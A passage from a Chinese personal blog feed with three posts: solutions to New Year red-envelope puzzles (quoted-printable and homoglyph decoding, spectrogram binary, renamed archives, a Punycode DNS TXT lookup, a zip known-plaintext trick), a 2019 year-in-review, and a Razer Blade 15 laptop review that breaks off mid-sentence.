src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-8.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1280\" height=\"530\"></a>\n<p><span>翻车现场之一</span></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-13.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1539\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-13.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1000\" height=\"286\"></a>\n<p><span>懵逼奶冰.webp</span></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-1.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1533\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-1.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1500\" height=\"462\"></a>\n<p>看得出有手写文字，不过是上下颠倒的，翻转图片得 <code>https://milkice.me/2020/uso.zip</code>。是个 zip，下载打开一看，有密码。<del>不会解，不做了。</del> 第一反应是暴力解密码，但是暴力跑了 15 分钟还是没有跑出来。暴力太不优雅了，肯定不是正确思路，但奶冰什么都不肯说了。不过在这时我终于发现第一个红包口令码就藏在压缩包的注释中，Get。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-15.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1544\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-15.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"806\" height=\"593\"></a>\n<p>然而题还没解完，回去看提示，看到提供了 osu 谱面下载，于是打算不管怎么样先下载来看看。然而 osu 谱面下载要登录，只好又花了几分钟找到第三方站点，成功下载。这时候可以注意到 uso.zip 里有个同名文件（432314 Mike Greene – Bill Nye the Science Guy Theme Song (Chinese Intro).osz），可以联想到是明文攻击。好吧，上 ARCHPR，十秒解出。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-5.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1530\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-5.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"462\" height=\"643\"></a>\n<p><span>现场还原.jpg</span></p>\n<p>.osz 文件并不是明文，猜测是压缩包（和 .pptx 一个思路嘛），于是改后缀 .zip 顺利打开。然后红包口令码就藏在奶冰的 .osu 文件中了，由提示可知是明文，打开即可得到。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-14.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1542\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-14.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"457\" height=\"255\"></a>\n<h1>我的红包</h1>\n<p>相比起来<a href=\"https://flyhigher.top/diary/1464.html\">我的题目</a>就简单很多了嘛…三天时间一共发出了 25 个红包，包括一位重复领取的🌚，比前几年还是多了一些的。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-16.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-16.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"500\" height=\"306\" class=\"aligncenter size-full wp-image-1554\"></a>\n<p><span>这位同学以后请不要多次领取🌚</span></p>\n<p>那么来看看答案吧。</p>\n<h2>第一阶段</h2>\n<p><code>=CE=B1=D1=85t=D0=BEn.=D1=96m/=D1=81=D0=BEd=D0=B5_=D0=BEf_2020_=E2=92=88m=CF=81=D0=B7</code></p>\n<p>首先观察字符串，可以发现 <code>.</code> <code>/</code> <code>_</code> 等一些 ASCII 字符原样留在了字符串中，而其他字符被由 <code>=</code> 和十六进制构成的某种编码所替代。如果你正好有所了解，你应该能认出这是 Quoted-printable 编码，这是一种常用于邮件中的编码，可以用<a href=\"https://mothereff.in/quoted-printable\">这个页面</a>解码。如果你不了解，你也应该可以发现这种编码和 URL 编码非常相似。如果你把 <code>=</code> 替换为 <code>%</code>，那么你就可以用各种方法顺利地把它按 URL 编码来进行解码，最后可以得到 <code>αхtоn.іm/соdе_оf_2020_⒈mρз</code>。这个字符串里大部分字符都不是 ASCII 字符，只是长得像而已。根据第一个提示“全是 ASCII 字符”，按样子把字符串用 ASCII 字符抄一遍，可以得到最终 URL 为 <code>axton.im/code_of_2020_1.mp3</code>。</p>\n<h2>第二阶段</h2>\n<p>下载音频，可以听出音频是经过某种处理的白噪音。白噪音的特点是各频段的功率都均匀分布，在白噪音上做文章，很容易就可以联想到线索藏在频谱中。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-8-1.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1534\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-8-1.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1200\" height=\"719\"></a>\n<p>频谱被处理成了 24×3 的网格，结合第二条提示“24×3，横向读取”可以推断出是将频谱当作二进制读取，得到 <code>01111001 01110010 01100011 00101110 01101101 01100101 00101111 00110010 00110000</code>，转为 ASCII 字符可得 <code>yrc.me/20</code>。</p>\n<h2>第三阶段</h2>\n<p>打开上一步得到的页面，提示要求输入十位数密码。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-10.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1536\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-10.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"663\" height=\"460\"></a>\n<p>如果你在上一步注意到了这个音频文件奇怪的属性，你可以反应过来这里的密码就是 <code>2000202020</code>。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-11.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1537\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-11.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"421\" height=\"651\"></a>\n<p>如果你没有注意到，查看页面代码可以看到一条注释 <code>&lt;!-- Tips: the attribute of the audio --&gt;</code> 将你引导向音频文件的属性。输入密码，解锁即可进入下一步。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-9.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1535\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-9.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"397\" height=\"223\"></a>\n<h2>第四阶段</h2>\n<p>可以看到是一张图片，内容为“<del>.JPG</del>”和“.ZIP”。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/2020-1-scaled.jpg\"><img loading=\"lazy\" class=\"aligncenter size-large wp-image-1532\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/2020-1-scaled.jpg?imageView2/1/w/724/h/1024/interlace/1/q/90&amp;x-oss-process=image/resize,m_fill,w_1448,h_2048/interlace,1/quality,Q_90#%23\" alt=\"\" width=\"724\" height=\"1024\"></a>\n<p>和去年一样的套路，下载图片，将后缀名改为 .zip 然后打开，可以看到 README.txt。</p>\n<h2>最后一步</h2>\n<p>查看 README.txt 的内容，可以了解到需要去 🤔.axton.cc 获取红包口令码。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-12.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1538\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-12.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1131\" height=\"278\"></a>\n<p>扔到浏览器里会出现奶冰同款找不到 IP，于是可以联想到 TXT 记录。唯一的问题是 🤔 这个 Emoji 需要如何处理。域名使用 Punycode 将 Unicode 字符转换为 ASCII 字符，特点是以 <code>xn--</code> 开头。如果你把上面这个域名扔进浏览器，你会发现它变成了 <code>xn--wp9h.axton.cc</code>。然后查询 TXT 记录，即可得到红包口令码。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-7.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1527\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-7.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"804\" height=\"557\"></a>\n","link":"https://flyhigher.top/develop/1519.html"},{"title":"无垠 2019 年度总结","date":"2019-12-29 12:25:52","description":"\n<p>又是时间飞快的一年…写 2018 总结的情景似乎还在眼前，转眼居然已经到 2019 年末了。</p>\n<p>2019 年，发生了太多事情，包括真的转折了人生的高考，这也导致我博客更新的不多（难以置信居然才更了两篇…），不过两篇技术性文章已经在路上了，可以期待一下。</p>\n<p>2019 年我也学了不少东西（单指技术方面），比如终于认真学了 Vue（但是还要练手）。书买了一大堆，看完的倒是没几本orz</p>\n<p>呼，好吧，是时候回顾一下充满坎坷的这一年了。2019 年还剩下最后两天，希望 2020 年，我能做得更好。</p>\n<h1>一些数据</h1>\n<p>照惯例先来看看一些数据吧。今年是统计系统完整统计了的第二年，终于可以和去年的数据比较一下了。以下数据的统计范围是 2019年1月1日0时至 2019年12月29日20时。</p>\n<h2>博客主站</h2>\n<p>无垠博客主站，年 UV 26,901 (<span>+4%</span>)，年 PV 76,583 (<span>+3%</span>)，日均 UV 73.7，平均停留时间 5分13秒 (<span>-13.8%</span>)，平均跳出率 53% (<span>+20.5%</span>)。一年有效文章数 2 (<span>-50%</span>)，新增评论 439 条。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/fh.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/fh.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1000\" height=\"1143\" class=\"aligncenter size-full wp-image-1511\"></a>\n<p>有趣的是今年文章数腰斩，访问数反而小有提升。<del>如果我哪天不更新了，访问数是不是可以无限大呢？</del></p>\n<p>今年博客最大的改动就是把整体风格切换到了 Material Design 2（当然这是 <a href=\"https://flyhigher.top/develop/788.html\">MDx</a> 中的可选功能，给自己打个广告2333），此外还有比较失败的 WebP 改造计划，因为和缓存冲突已经回滚了。<a href=\"https://flyhigher.top/develop/1245.html\">ABS 系统</a>进展不大，主要是真的没有太多时间，还是要再学习一个。</p>\n<h2>个人主页</h2>\n<p>虽然个人主页的 TODO List 列了老长，但今年完全没有更新，也没有推广，从今年 8 月底开始还莫名被某墙认证了，直到 11 月底才恢复，于是今年总访问量比去年少了很多，</p>\n<p>有多少呢？这么少：总 UV 2,141 (<span>-65.9%</span>)，总 PV 2,744 (<span>-66.6%</span>)，日均 UV 6 (<span>-65.9%</span>)，平均停留时间 62秒 (<span>+19.2%</span>)。主要来源是知乎和 V2EX，还有一些甚至是从微信来的。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/axton.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/axton.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1000\" height=\"1103\" class=\"aligncenter size-full wp-image-1512\"></a>\n<h2>MDx</h2>\n<p>一年中，MDx 更新了 8 次，新增 171 commits，2 种语言的翻译，Star 数增加了 175，现有 408。感谢所有人的支持，尤其是 <a href=\"https://github.com/Sn0bzy\" rel=\"noopener noreferrer\" target=\"_blank\">Hasan CAN</a>, <a href=\"https://github.com/yechs\" rel=\"noopener noreferrer\" target=\"_blank\">Ye Shu</a>, <a href=\"https://github.com/StarryLeo\" rel=\"noopener noreferrer\" target=\"_blank\">StarryLeo</a>, <a href=\"https://github.com/DCTewi\" rel=\"noopener noreferrer\" target=\"_blank\">冻葱Tewi</a>, <a href=\"https://github.com/syfxlin\" rel=\"noopener noreferrer\" target=\"_blank\">Otstar Lin</a> 等为 MDx 做出了不小贡献的你们。</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"yrccondor\" data-mdxgithubp=\"mdx\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/yrccondor/mdx\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<h1>大事记</h1>\n<ul>\n<li>一月：<a href=\"https://flyhigher.top/photograph/1309.html\">上手</a> DJI OSMO Pocket</li>\n<li>四月：最后一次参加浙江省普通高中学业水平考试</li>\n<li>五月：MDx 喜提 300 Stars</li>\n<li>六月：高考 <del>炸了，差亿点点上浙大</del>\n</li>\n<li>六月：入手了 Oneplus 7 Pro</li>\n<li>六月：和同学一起去成都重庆旅行</li>\n<li>六月：第一次近距离感受到地震</li>\n<li>六月：<a href=\"https://flyhigher.top/diary/1411.html\">入手</a>了一台雷蛇灵刃 15，目前是主力机</li>\n<li>七月：参与组织 THE Hack 2019 活动</li>\n<li>七月：面基了 <a href=\"https://itroy.cc/\" rel=\"noopener noreferrer\" target=\"_blank\">Tory</a>, Bie Shi 和 <a href=\"https://oxz.me/\" rel=\"noopener noreferrer\" target=\"_blank\">FHYunCai</a>\n</li>\n<li>八月：一个人去厦门武汉转了一圈，拍了自己的第一个 Vlog</li>\n<li>八月：入手了一个 Kindle Paperwhite 4，没有泡面可以压，于是用来看英文小说了</li>\n<li>八月：加入 TEDxNingbo 志愿者团队</li>\n<li>八月：和 Ralph 面基</li>\n<li>八月：入手了一个 Yubikey</li>\n<li>九月：人生第一次参加雅思考试 <del>7分，蛮开心的</del>\n</li>\n<li>十月：入手了一个 Samsung Galaxy Watch Active 2 <del>觉得不值</del>\n</li>\n<li>十一月：MDx 达到 400 Stars</li>\n<li>十一月：为 TEDxNingbo 设计开发的 H5 上线</li>\n<li>十一月：入手了第一台胶片相机，试图入坑胶片摄影</li>\n<li>十一月：参加 TEDxNingbo 2019 大会</li>\n<li>十二月：<del>我 Cytus II 入门了</del>\n</li>\n</ul>\n<h1>跨年红包</h1>\n<p>这算「传统习俗」了。和以前一样，红包不是白拿的，你需要一点点技术力来解密拿到红包。有效期截至 2020年1月2日。</p>\n<p>今年的解谜旅程，从下面这个字符串开始。</p>\n<p><code>=CE=B1=D1=85t=D0=BEn.=D1=96m/=D1=81=D0=BEd=D0=B5_=D0=BEf_2020_=E2=92=88m=CF=81=D0=B7</code></p>\n<p>由于今年的题目比以前稍微难了一些，所以今年的红包金额还是比较大的，而且不限量，尽你所能试一试吧。</p>\n<p>一点你可能用得上的提示：URL 里全是 ASCII 字符 / 24×3，横向读取。</p>\n<p><a href=\"https://flyhigher.top/develop/1519.html\">答案</a>已公布。</p>\n<h1>跨年海报</h1>\n<p>这算是另一个「传统习俗」（笑）。因为我有做跨年海报的习惯，所以以下就是今年份的海报啦。</p>\n<p>用了 C4D+PS，还有我的一整个下午。</p>\n<p>提前祝各位新年快乐！</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/2020-f-web-scaled.jpg\"><img loading=\"lazy\" class=\"aligncenter wp-image-1467 size-large\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/2020-f-web-scaled.jpg?imageView2/1/w/724/h/1024/interlace/1/q/90&amp;x-oss-process=image/resize,m_fill,w_1448,h_2048/interlace,1/quality,Q_90#%23\" alt=\"\" width=\"724\" height=\"1024\"></a>\n","link":"https://flyhigher.top/diary/1464.html"},{"title":"Razer Blade 灵刃 15 2019 精英版简评","date":"2019-07-27 19:22:58","description":"\n<blockquote><p>“你这什么电脑啊，也是惠普的么？比我的还重一点欸。”同学拿着暗影精灵说。<br>\n“emmmm….杂牌电脑，买灯送的。”</p></blockquote>\n<h1>故事</h1>\n<p>考完高考，该换台电脑了。我此前在用的是一台 Dell Inspiron 15 7560，一台从商务本的角度来看还算不错的笔记本，平常用来写写代码还不错，但在我剪视频以及折腾 C4D 的时候明显有些力不从心，更别提运行大型游戏了。于是趁着这次换机机会，我打算换一台<strong>性能还算不错，又能带着走</strong>的笔记本。这么想着，我列出了我的需求：</p>\n<ul>\n<li>性能较高</li>\n<li>便携性好（薄、重量轻、电池续航长等）</li>\n<li>外观低调</li>\n<li>预算最高 2.5w</li>\n</ul>\n<p>由于并不喜欢外观太张扬的「游戏本风格」，我希望我选择的笔记本外观干净低调。此外，由于我最近正在折腾学习 ML，我希望显卡可以是 20 系的（虽然 10 系也不是不能用…）。满足以上需求的只有以下几种选择：</p>\n<ul>\n<li>技嘉 Aero 15</li>\n<li>Razer Blade 15 2019 精英版</li>\n<li>msi GS75</li>\n</ul>\n<p>至于败家之眼由于太过张扬，直接被我排除了。在仅剩的三个选择里面，Razer Blade 15 的外观在我看来是最低调简约的，而且屏幕有 1080P+240Hz 和 4K+触摸两种都很不错的规格可选，唯一的问题大概就是在 10 代 U 都快能买到的时候，Razer Blade 15 的 CPU 还是 8 代的。</p>\n<p>（哦…缺点大概还有比较贵吧…）</p>\n<p>在我纠结的时候，我联系的卖家告诉我 Razer Blade 9 代 U 的版本已经到国内总代了，如果顺利的话他可以在 6.16 第一批直接给我发货；另外他也可以为高考生提供优惠。既然都这样了还有什么好纠结的，买了！选了 2070 Max-Q/16GB/256GB/1080P/240Hz 的版本，下单付款，果然在 16 号顺利入手。</p>\n<p>最终确定这个配置是因为 2080 的版本太贵，但是 4K 触摸屏版本只在 2080 版本上有，只好选了 1080P；另外 512 GB 的版本比我买的 256 GB 贵了 2K，于是决定自己买块 1T 的盘换掉。</p>\n<h1>开箱</h1>\n<p>包装箱也很低调，只在侧面露出一抹骚绿。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer13.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer13.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2500\" height=\"1875\" class=\"aligncenter size-full wp-image-1398\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer13.jpg 2500w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer13-300x225.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer13-768x576.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer13-1024x768.jpg 1024w\" sizes=\"(max-width: 2500px) 100vw, 2500px\"></a>\n<p>正面和背面。照片是在用了一个多月以后拍的，看起来有点脏。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer8.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer8.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2000\" height=\"1349\" class=\"aligncenter size-full wp-image-1394\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer8.jpg 2000w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer8-300x202.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer8-768x518.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer8-1024x691.jpg 1024w\" sizes=\"(max-width: 2000px) 100vw, 2000px\"></a>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer10.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer10.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2300\" height=\"1630\" class=\"aligncenter size-full wp-image-1386\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer10.jpg 2300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer10-300x213.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer10-768x544.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer10-1024x726.jpg 1024w\" sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<p>卸下后盖十颗梅花螺丝就能打开后盖。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer14.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer14.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2000\" height=\"2636\" class=\"aligncenter size-full wp-image-1399\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer14.jpg 2000w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer14-228x300.jpg 228w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer14-768x1012.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer14-777x1024.jpg 777w\" sizes=\"(max-width: 2000px) 100vw, 2000px\"></a>\n<p>SSD、内存条和无线网卡都在触手可及的地方。这张图里我已经换好了 SSD。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer15.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer15.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2500\" height=\"1790\" class=\"aligncenter size-full wp-image-1400\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer15.jpg 2500w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer15-300x215.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer15-768x550.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer15-1024x733.jpg 1024w\" sizes=\"(max-width: 2500px) 100vw, 2500px\"></a>\n<p>网卡是 AX200NGW，Intel 第一款支持 Wi-Fi 6 的网卡，好评。内存为双通道 DDR4，支持 XMP，不过我懒得折腾了。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer16.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer16.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2000\" height=\"1795\" class=\"aligncenter size-full wp-image-1401\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer16.jpg 2000w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer16-300x269.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer16-768x689.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer16-1024x919.jpg 1024w\" sizes=\"(max-width: 2000px) 100vw, 2000px\"></a>\n<p><strong>后盖只有一处卡扣，在靠近转轴一侧中间的位置，安装后盖的时候需要注意下。此外后盖和机身卡得比较紧，安装的时候需要注意下后盖有没有完全卡入机身。</strong></p>\n<p>然后开机。硬盘复制和升级系统什么的就不再赘述了。自带 Windows 10 家庭版，为了装 Docker 我升级到了专业版。</p>\n<p>从开箱到现在，我已经使用这台电脑一月有余。讲讲使用上的感受吧。</p>\n<h1>机身</h1>\n<p><strong>有人说 Blade 就是 Windows 版的 Macbook，这个说法其实还算贴切。</strong>整个金属材质的 A 面只有一个 Razer 的 Logo，屏幕点亮的时候会一同亮起。B 面是支持 Windows Hello 的摄像头、屏幕和一个比较低调的 Razer Logo。屏幕三面边框比较窄，观感不错。<strong>而一旦打开屏幕，Windows Hello 就会开始识别你的面部，并极快地解锁进入桌面，很舒服。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer11.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer11.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2000\" height=\"1500\" class=\"aligncenter size-full wp-image-1396\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer11.jpg 2000w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer11-300x225.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer11-768x576.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer11-1024x768.jpg 1024w\" sizes=\"(max-width: 2000px) 100vw, 2000px\"></a>\n<p><span>和 Windows Hello 说声 Hello？</span></p>\n<p><strong>B 面边缘有一圈非常细的胶圈，可以在屏幕闭合的时候起密封的作用（不过实测效果不大…）。</strong>C 面是键盘、扬声器、开机键和触控板，这些后面会细说。<strong>D 面是塑料材质，有两条蛮厚的橡胶条把机身垫高</strong>，猜测是为了散热。</p>\n<p>Razer Blade 15 的接口比较丰富。左侧：</p>\n<ul>\n<li>电源接口</li>\n<li>2 个 USB 3.2 Gen 2 Type-A 接口</li>\n<li>1 个 3.5 mm 组合音频插孔</li>\n</ul>\n<p>右侧：</p>\n<ul>\n<li>1 个 USB 3.2 Gen 2 Type-A 接口</li>\n<li>1 个雷电 3 接口（通过 GPU 输出）</li>\n<li>1 个 HDMI 2.0B 接口</li>\n<li>1 个 MiniDisplayPort 1.4 接口</li>\n<li>安全锁孔</li>\n</ul>\n<p>这些接口日常使用完全够用，通过雷电 3 也能获得不错的拓展性（不过雷电 3 似乎需要跟独显抢带宽…）。</p>\n<p><strong>机身边缘比较锐，不过出乎意料地不是非常割手。</strong>之前在用的 Dell Inspiron 15 7560 边缘极其锋利，非常割手，难受。现在（相对来说）打字舒服很多了，好评。</p>\n<p><strong>机身很薄，薄到有点出乎意料。</strong>官方数据只有 17.8mm，就算加上把机身垫高了的橡胶条也还是比一枚硬币矮。然而毕竟还是塞了这么多硬件进去，看起来轻薄但<strong>实际上一点都不轻</strong>，官方数据 2.07 kg，加上砖头一样的电源适配器，<strong>出趟门其实还是有点累的。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer9.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer9.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2300\" height=\"1136\" class=\"aligncenter size-full wp-image-1395\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer9.jpg 2300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer9-300x148.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer9-768x379.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer9-1024x506.jpg 1024w\" sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<h1>续航</h1>\n<p>出乎意料，<strong>续航还不错</strong>，达到了我的预期。电池达到了 80Wh，我日常一个 VSCode 写代码，一个 Chrome 查资料，<strong>续航可以达到 8 小时出头</strong>，就算是在玩 HITMAN 1 小时后，电量仍能剩余一半左右。也就是说，短时间的移动办公完全不是问题，可以不带上厚重的电源适配器，算是解决了一部分「重」的问题吧。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer12.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer12.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2500\" height=\"1860\" class=\"aligncenter size-full wp-image-1397\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer12.jpg 2500w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer12-300x223.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer12-768x571.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer12-1024x762.jpg 1024w\" sizes=\"(max-width: 2500px) 100vw, 2500px\"></a>\n<p><span>电源适配器有点大</span></p>\n<h1>屏幕</h1>\n<p><strong>爽！真的爽！240Hz 刷新率带来的是实打实的流畅感</strong>，和 90Hz 那种需要用一段时间才能感受到的流程感不同， 240Hz 带来的是在桌面上划划鼠标都能感受到的异常流畅的感觉。</p>\n<p>不过受限于这块 2070 Max-Q，很多游戏游戏都没能完全利用这块屏幕的性能，再加上我不玩 FPS 游戏，高刷新率对我来说意义不大，<strong>这块屏幕的 240Hz 对我来说噱头大于实际作用（但是没得选啊…）。</strong>屏幕为 IPS 面板，覆盖 100% sRGB，并有出厂校色。由于我手头没有校色设备，具体参数暂时无法测量，但就官方数据来看，这块屏幕的素质还是不错的。当然 4K 版本由于面向设计师等，屏幕参数会更好，可惜我是体验不到了。</p>\n<h1>键盘、触控板和扬声器</h1>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer5.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer5.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2300\" height=\"1619\" class=\"aligncenter size-full wp-image-1391\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer5.jpg 2300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer5-300x211.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer5-768x541.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer5-1024x721.jpg 1024w\" sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<p>打开屏幕第一反应：<strong>这触控板有点大啊。</strong>Rzaer Blade 15 配备的触控板比 Dell Inspiron 15 7560 大上一整圈，采用类玻璃材质，手感不错。触控板使用了微软 Precision 驱动，对 Windows 的各类手势支持良好。</p>\n<p><strong>键盘总的来说还行</strong>，键程不短，触感不算太软，为平面键帽；没有小键盘，不过方向键的大小与其他键一致。有一点要吐槽的就是键盘的按键标识是上下颠倒的…也就是需要配合 <kbd>Shift</kbd> 